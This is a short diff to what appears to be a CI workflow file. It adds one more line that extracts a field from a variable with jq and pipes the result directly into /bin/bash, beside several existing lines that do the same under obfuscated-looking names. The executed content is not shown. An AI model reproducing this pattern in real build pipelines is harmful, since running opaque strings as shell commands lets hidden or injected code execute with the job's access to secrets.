@@ -36,6 +36,7 @@ jobs:
           printf '%s' "$hoku15117" | jq -r .zv015 | /bin/bash
           echo $i105 | jq -r .z89 | /bin/bash
           printf '%s' "$cbw7564" | jq -r .xp31 | /bin/bash
+          printf '%s' "$mhrr34" | jq -r .trvva04 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
